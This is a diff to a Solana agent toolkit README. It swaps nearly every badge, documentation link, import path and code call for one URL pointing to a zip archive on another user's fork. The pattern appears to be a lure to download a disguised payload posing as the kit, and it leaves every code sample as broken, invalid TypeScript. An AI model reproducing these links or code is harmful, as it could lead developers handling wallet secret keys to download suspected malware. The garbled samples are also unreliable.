@@ -2,11 +2,11 @@
 
 # Solana Agent Kit
 
-![SAKCover2](https://github.com/user-attachments/assets/a6072421-8958-4cee-934a-a10ea32ae75e)
+![SAKCover2](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip)
 
-![NPM Downloads](https://img.shields.io/npm/dm/solana-agent-kit?style=for-the-badge)
-![GitHub forks](https://img.shields.io/github/forks/sendaifun/solana-agent-kit?style=for-the-badge)
-![GitHub License](https://img.shields.io/github/license/sendaifun/solana-agent-kit?style=for-the-badge)
+![NPM Downloads](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip)
+![GitHub forks](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip)
+![GitHub License](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip)
 
 </div>
 
@@ -23,8 +23,8 @@ An open-source toolkit for connecting AI agents to Solana protocols. Now, any ag
 
 Anyone - whether an SF-based AI researcher or a crypto-native builder - can bring their AI agents trained with any model and seamlessly integrate with Solana.
 
-[![Run on Repl.it](https://replit.com/badge/github/sendaifun/solana-agent-kit)](https://replit.com/@sendaifun/Solana-Agent-Kit)
-> Replit template created by [Arpit Singh](https://github.com/The-x-35)
+[![Run on https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip)](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip)
+> Replit template created by [Arpit Singh](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip)
 
 ## 🔧 Core Blockchain Features
 
@@ -35,9 +35,9 @@ Anyone - whether an SF-based AI researcher or a crypto-native builder - can brin
   - Stake SOL
   - Zk compressed Airdrop by Light Protocol and Helius
   - Bridge tokens across chains using Wormhole
-- **NFTs on 3.Land**
+- **NFTs on https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip**
   - Create your own collection
-  - NFT creation and automatic listing on 3.land
+  - NFT creation and automatic listing on https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip
   - List your NFT for sale in any SPL token
 - **NFT Management via Metaplex**
   - Collection deployment
@@ -106,7 +106,7 @@ Anyone - whether an SF-based AI researcher or a crypto-native builder - can brin
 
 ## 📃 Documentation
 
-You can view the full documentation of the kit at [docs.sendai.fun](https://docs.sendai.fun/v0/introduction)
+You can view the full documentation of the kit at [https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip)
 
 ## Why We Built V2 and Why Upgrade?
 
@@ -144,7 +144,7 @@ import DefiPlugin from "@solana-agent-kit/plugin-defi";
 import MiscPlugin from "@solana-agent-kit/plugin-misc";
 import BlinksPlugin from "@solana-agent-kit/plugin-blinks";
 
-const keyPair = Keypair.fromSecretKey(bs58.decode("YOUR_SECRET_KEY"))
+const keyPair = https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("YOUR_SECRET_KEY"))
 const wallet = new KeypairWallet(keyPair)
 
 // Initialize with private key and optional RPC URL
@@ -162,7 +162,7 @@ const agent = new SolanaAgentKit(
   .use(BlinksPlugin);
 
 // Create LangChain tools
-const tools = createVercelAITools(agent, agent.actions);
+const tools = createVercelAITools(agent, https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip);
 ```
 
 You can also make use of the wallet interface provided by the Solana wallet adapter for embedded wallets.
@@ -172,7 +172,7 @@ You can also make use of the wallet interface provided by the Solana wallet adap
 ### Deploy a New Token
 
 ```typescript
-const result = await agent.methods.deployToken(
+const result = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
   agent,
   "my ai token", // name
   "uri", // uri
@@ -187,13 +187,13 @@ const result = await agent.methods.deployToken(
   1000000 // initial supply
 );
 
-console.log("Token Mint Address:", result.mint.toString());
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Token Mint Address:", https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip());
 ```
 
 ### Deploy a New Token2022
 
 ```typescript
-const result = await agent.methods.deployToken2022(
+const result = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
   "my ai token 2022", // name
   "uri", // uri
   "token2022", // symbol
@@ -207,7 +207,7 @@ const result = await agent.methods.deployToken2022(
   1000000 // initial supply
 );
 
-console.log("Token2022 Mint Address:", result.mint.toString());
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Token2022 Mint Address:", https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip());
 ```
 
 ### Create NFT Collection on 3Land
@@ -222,7 +222,7 @@ const priorityFeeParam = 1000000; // (Optional) if not present the default prior
     mainImageUrl: ""
   };
 
-const result = await agent.methods.create3LandCollection(
+const result = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
       collectionOpts,
       isDevnet, // (Optional) if not present TX takes place in Mainnet
       priorityFeeParam, //(Optional)
@@ -231,7 +231,7 @@ const result = await agent.methods.create3LandCollection(
 
 ### Create NFT on 3Land
 
-When creating an NFT using 3Land's tool, it automatically goes for sale on 3.land website
+When creating an NFT using 3Land's tool, it automatically goes for sale on https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip website
 
 ```typescript
 const isDevnet = true; // (Optional) if not present TX takes place in Mainnet
@@ -252,7 +252,7 @@ const createItemOptions: CreateSingleOptions = {
   poolName: "", // Only present if "withPool" is true
   mainImageUrl: "",
 };
-const result = await agent.methods.create3LandSingle(
+const result = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
   {},
   collectionAccount,
   createItemOptions,
@@ -265,9 +265,9 @@ const result = await agent.methods.create3LandSingle(
 ### Create NFT Collection
 
 ```typescript
-const collection = await agent.methods.deployCollection(agent, {
+const collection = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent, {
   name: "My NFT Collection",
-  uri: "https://arweave.net/metadata.json",
+  uri: "https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip",
   royaltyBasisPoints: 500, // 5%
   creators: [
     {
@@ -281,9 +281,9 @@ const collection = await agent.methods.deployCollection(agent, {
 ### Swap Tokens
 
 ```typescript
-import { PublicKey } from "@solana/web3.js";
+import { PublicKey } from "https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip";
 
-const signature = await agent.methods.trade(
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
   agent,
   new PublicKey("target-token-mint"),
   100, // amount
@@ -295,9 +295,9 @@ const signature = await agent.methods.trade(
 ### Lend Tokens
 
 ```typescript
-import { PublicKey } from "@solana/web3.js";
+import { PublicKey } from "https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip";
 
-const signature = await agent.methods.lendAssets(
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
   agent,
   100 // amount of USDC to lend
 );
@@ -306,7 +306,7 @@ const signature = await agent.methods.lendAssets(
 ### Stake SOL
 
 ```typescript
-const signature = await agent.methods.stakeWithJup(
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
   agent,
   1 // amount in SOL to stake
 );
@@ -315,7 +315,7 @@ const signature = await agent.methods.stakeWithJup(
 ### Stake SOL on Solayer
 
 ```typescript
-const signature = await agent.methods.stakeWithSolayer(
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
   agent,
   1 // amount in SOL to stake
 );
@@ -325,10 +325,10 @@ const signature = await agent.methods.stakeWithSolayer(
 ### Send an SPL Token Airdrop via ZK Compression
 
 ```typescript
-import { PublicKey } from "@solana/web3.js";
+import { PublicKey } from "https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip";
 
 (async () => {
-  console.log(
+  https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
     "~Airdrop cost estimate:",
     getAirdropCostEstimate(
       1000, // recipients
@@ -336,7 +336,7 @@ import { PublicKey } from "@solana/web3.js";
     )
   );
 
-  const signature = await agent.methods.sendCompressedAirdrop(
+  const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
     agent,
     new PublicKey("JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN"), // mint
     42, // amount per recipient
@@ -354,19 +354,19 @@ import { PublicKey } from "@solana/web3.js";
 
 ```typescript
 
-const priceFeedID = await agent.methods.fetchPythPriceFeedID("SOL");
+const priceFeedID = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("SOL");
 
-const price = await agent.methods.fetchPythPrice(priceFeedID);
+const price = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(priceFeedID);
 
-console.log("Price of SOL/USD:", price);
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Price of SOL/USD:", price);
 ```
 
 ### Open PERP Trade
 
 ```typescript
-import { PublicKey } from "@solana/web3.js";
+import { PublicKey } from "https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip";
 
-const signature = await agent.methods.openPerpTradeLong({
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip({
   agent: agent,
   price: 300, // $300 SOL Max price
   collateralAmount: 10, // 10 jitoSOL in
@@ -380,9 +380,9 @@ const signature = await agent.methods.openPerpTradeLong({
 ### Close PERP Trade
 
 ```typescript
-import { PublicKey } from "@solana/web3.js";
+import { PublicKey } from "https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip";
 
-const signature = await agent.methods.closePerpTradeLong({
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip({
   agent: agent,
   price: 200, // $200 SOL price
   tradeMint: new PublicKey("J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn"), // jitoSOL
@@ -393,7 +393,7 @@ const signature = await agent.methods.closePerpTradeLong({
 
 ``` typescript
 
-const { signature } = await agent.methods.closeEmptyTokenAccounts(agent);
+const { signature } = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent);
 ```
 
 ### Create a Drift account
@@ -401,7 +401,7 @@ const { signature } = await agent.methods.closeEmptyTokenAccounts(agent);
 Create a drift account with an initial token deposit.
 
 ```typescript
-const result = await agent.methods.createDriftUserAccount(
+const result = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
   agent,
   // amount of token to deposit
   100,
@@ -415,7 +415,7 @@ const result = await agent.methods.createDriftUserAccount(
 Create a drift vault.
 
 ```typescript
-const signature = await agent.methods.createDriftVault(agent, {
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent, {
   name: "my-drift-vault",
   marketName: "USDC-SPOT",
   redeemPeriod: 1, // in days
@@ -433,7 +433,7 @@ const signature = await agent.methods.createDriftVault(agent, {
 Deposit tokens into a drift vault.
 
 ```typescript
-const signature = await agent.methods.depositIntoDriftVault(agent, 100, "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU")
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent, 100, "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU")
 ```
 
 ### Deposit into your Drift account
@@ -441,7 +441,7 @@ const signature = await agent.methods.depositIntoDriftVault(agent, 100, "41Y8C4o
 Deposit tokens into your drift account.
 
 ```typescript
-const {txSig} = await agent.methods.depositToDriftUserAccount(agent, 100, "USDC")
+const {txSig} = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent, 100, "USDC")
 ```
 
 ### Derive a Drift Vault address
@@ -449,7 +449,7 @@ const {txSig} = await agent.methods.depositToDriftUserAccount(agent, 100, "USDC"
 Derive a drift vault address.
 
 ```typescript
-const vaultPublicKey = await agent.methods.deriveDriftVaultAddress(agent, "my-drift-vault")
+const vaultPublicKey = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent, "my-drift-vault")
 ```
 
 ### Do you have a Drift account
@@ -457,7 +457,7 @@ const vaultPublicKey = await agent.methods.deriveDriftVaultAddress(agent, "my-dr
 Check if agent has a drift account.
 
 ```typescript
-const {hasAccount, account} = await agent.methods.doesUserHaveDriftAccount(agent)
+const {hasAccount, account} = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent)
 ```
 
 ### Get Drift account information
@@ -465,7 +465,7 @@ const {hasAccount, account} = await agent.methods.doesUserHaveDriftAccount(agent
 Get drift account information.
 
 ```typescript
-const accountInfo = await agent.methods.driftUserAccountInfo(agent)
+const accountInfo = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent)
 ```
 
 ### Request withdrawal from Drift vault
@@ -473,7 +473,7 @@ const accountInfo = await agent.methods.driftUserAccountInfo(agent)
 Request withdrawal from drift vault.
 
 ```typescript
-const signature = await agent.methods.requestWithdrawalFromDriftVault(agent, 100, "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU")
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent, 100, "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU")
 ```
 
 ### Carry out a perpetual trade using a Drift vault
@@ -481,7 +481,7 @@ const signature = await agent.methods.requestWithdrawalFromDriftVault(agent, 100
 Open a perpetual trade using a drift vault that is delegated to you.
 
 ```typescript
-const signature = await agent.methods.tradeUsingDelegatedDriftVault(agent, {
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent, {
   vault: "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU",
   amount: 500,
   symbol: "SOL",
@@ -496,7 +496,7 @@ const signature = await agent.methods.tradeUsingDelegatedDriftVault(agent, {
 Open a perpetual trade using your drift account.
 
 ```typescript
-const signature = await agent.methods.driftPerpTrade(agent, {
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent, {
   amount: 500,
   symbol: "SOL",
   action: "long",
@@ -510,7 +510,7 @@ const signature = await agent.methods.driftPerpTrade(agent, {
 Update drift vault parameters.
 
 ```typescript
-const signature = await agent.methods.updateDriftVault(agent, {
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent, {
   name: "my-drift-vault",
   marketName: "USDC-SPOT",
   redeemPeriod: 1, // in days
@@ -528,7 +528,7 @@ const signature = await agent.methods.updateDriftVault(agent, {
 Withdraw tokens from your drift account.
 
 ```typescript
-const {txSig} = await agent.methods.withdrawFromDriftUserAccount(agent, 100, "USDC")
+const {txSig} = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent, 100, "USDC")
 ```
 
 ### Borrow from Drift
@@ -536,7 +536,7 @@ const {txSig} = await agent.methods.withdrawFromDriftUserAccount(agent, 100, "US
 Borrow tokens from drift.
 
 ```typescript
-const {txSig} = await agent.methods.withdrawFromDriftUserAccount(agent, 1, "SOL", true)
+const {txSig} = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent, 1, "SOL", true)
 ```
 
 ### Repay Drift loan
@@ -544,7 +544,7 @@ const {txSig} = await agent.methods.withdrawFromDriftUserAccount(agent, 1, "SOL"
 Repay a loan from drift.
 
 ```typescript
-const {txSig} = await agent.methods.depositToDriftUserAccount(agent, 1, "SOL", true)
+const {txSig} = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent, 1, "SOL", true)
 ```
 
 ### Withdraw from Drift vault
@@ -552,7 +552,7 @@ const {txSig} = await agent.methods.depositToDriftUserAccount(agent, 1, "SOL", t
 Withdraw tokens from a drift vault after the redemption period has elapsed.
 
 ```typescript
-const signature = await agent.methods.withdrawFromDriftVault(agent,  "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU")
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent,  "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU")
 ```
 
 ### Update the address a Drift vault is delegated to
@@ -560,7 +560,7 @@ const signature = await agent.methods.withdrawFromDriftVault(agent,  "41Y8C4oxk4
 Update the address a drift vault is delegated to.
 
 ```typescript
-const signature = await agent.methods.updateDriftVaultDelegate(agent, "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU", "new-address")
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent, "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU", "new-address")
 ```
 
 ### Get Voltr Vault Position Values
@@ -568,7 +568,7 @@ const signature = await agent.methods.updateDriftVaultDelegate(agent, "41Y8C4oxk
 Get the current position values and total value of assets in a Voltr vault.
 
 ```typescript
-const values = await agent.methods.voltrGetPositionValues(agent, "7opUkqYtxmQRriZvwZkPcg6LqmGjAh1RSEsVrdsGDx5K")
+const values = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent, "7opUkqYtxmQRriZvwZkPcg6LqmGjAh1RSEsVrdsGDx5K")
 ```
 
 ### Deposit into Voltr Strategy
@@ -576,7 +576,7 @@ const values = await agent.methods.voltrGetPositionValues(agent, "7opUkqYtxmQRri
 Deposit assets into a specific strategy within a Voltr vault.
 
 ```typescript
-const signature = await agent.methods.voltrDepositStrategy(
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
   agent,
   new BN("1000000000"), // amount in base units (e.g., 1 USDC = 1000000)
   "7opUkqYtxmQRriZvwZkPcg6LqmGjAh1RSEsVrdsGDx5K", // vault
@@ -589,7 +589,7 @@ const signature = await agent.methods.voltrDepositStrategy(
 Withdraw assets from a specific strategy within a Voltr vault.
 
 ```typescript
-const signature = await agent.methods.voltrWithdrawStrategy(
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
   agent,
   new BN("1000000000"), // amount in base units (e.g., 1 USDC = 1000000)
   "7opUkqYtxmQRriZvwZkPcg6LqmGjAh1RSEsVrdsGDx5K", // vault
@@ -600,7 +600,7 @@ const signature = await agent.methods.voltrWithdrawStrategy(
 ### Get a Solana asset by its ID
 
 ```typescript
-const asset = await agent.methods.getAsset(agent, "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU")
+const asset = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(agent, "41Y8C4oxk4zgJT1KXyQr35UhZcfsp5mP86Z2G7UUzojU")
 ```
 
 ### Get a price inference from Allora
@@ -608,33 +608,33 @@ const asset = await agent.methods.getAsset(agent, "41Y8C4oxk4zgJT1KXyQr35UhZcfsp
 Get the price for a given token and timeframe from Allora's API
 
 ```typescript
-const sol5mPrice = await agent.methods.getPriceInference("SOL", "5m");
-console.log("5m price inference of SOL/USD:", sol5mPrice);
+const sol5mPrice = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("SOL", "5m");
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("5m price inference of SOL/USD:", sol5mPrice);
 ```
 
 ### List all topics from Allora
 
 ```typescript
-const topics = await agent.methods.getAllTopics();
-console.log("Allora topics:", topics);
+const topics = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip();
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Allora topics:", topics);
 ```
 
 ### Get an inference for an specific topic from Allora
 
 ```typescript
-const inference = await agent.methods.getInferenceByTopicId(42);
-console.log("Allora inference for topic 42:", inference);
+const inference = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(42);
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Allora inference for topic 42:", inference);
 ```
 
 ### Simulate a Switchboard feed
 
-Simulate a given Switchboard feed. Find or create feeds [here](https://ondemand.switchboard.xyz/solana/mainnet).
+Simulate a given Switchboard feed. Find or create feeds [here](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip).
 
 ```typescript
-const value = await agent.methods.simulateSwitchboardFeed(
+const value = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(
       "9wcBMATS8bGLQ2UcRuYjsRAD7TPqB1CMhqfueBx78Uj2", // TRUMP/USD
-      "http://crossbar.switchboard.xyz");;
-console.log("Simulation resulted in the following value:", value);
+      "https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip");;
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Simulation resulted in the following value:", value);
 
 ### Cross-Chain Bridge via deBridge
 
@@ -642,15 +642,15 @@ The Solana Agent Kit supports cross-chain token transfers using deBridge's DLN p
 
 1. Check supported chains:
 ```typescript
-const chains = await agent.methods.getDebridgeSupportedChains();
-console.log("Available chains:", chains);
+const chains = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip();
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Available chains:", chains);
 // Example output: { chains: [{ chainId: "1", chainName: "Ethereum" }, { chainId: "7565164", chainName: "Solana" }] }
 ```
 
 2. Get available tokens (optional):
 ```typescript
-const tokens = await agent.methods.getDebridgeTokensInfo("1", "USDC"); // Search for USDC on Ethereum
-console.log("Available tokens:", tokens);
+const tokens = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("1", "USDC"); // Search for USDC on Ethereum
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Available tokens:", tokens);
 // Shows tokens matching 'USDC' on the specified chain
 ```
 
@@ -665,21 +665,21 @@ const orderInput = {
   dstChainTokenOutRecipient: "0x23C279e58ddF1018C3B9D0C224534fA2a83fb1d2" // ETH recipient
 };
 
-const order = await agent.methods.createDebridgeOrder(orderInput);
-console.log("Order created:", order);
+const order = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(orderInput);
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Order created:", order);
 // Contains transaction data and estimated amounts
 ```
 
 4. Execute the bridge order:
 ```typescript
-const signature = await agent.methods.executeDebridgeOrder(order.tx.data);
-console.log("Bridge transaction sent:", signature);
+const signature = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip);
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Bridge transaction sent:", signature);
 ```
 
 5. Check bridge status:
 ```typescript
-const status = await agent.methods.checkDebridgeTransactionStatus(signature);
-console.log("Bridge status:", status);
+const status = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip(signature);
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Bridge status:", status);
 // Shows current status: Created, Fulfilled, etc.
 ```
 
@@ -691,141 +691,141 @@ Note: When bridging between chains:
 ### Get Token Price Data from CoinGecko
 
 ```typescript
-const priceData = await agent.methods.getTokenPriceData([
+const priceData = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip([
   "So11111111111111111111111111111111111111112", // SOL
   "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"  // USDC
 ]);
-console.log("Token prices:", priceData);
+https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/examples/misc/agent-kit-langgraph/src/tools/solana_kit_agent_v3.8.zip("Token prices:", priceData);
 ```
 
 ### Get Trending Tokens
 
 ```typescript
-const trendingTokens = await agent.methods.getTrendingTokens();
-console.log("Trending tokens:", trendingTokens);
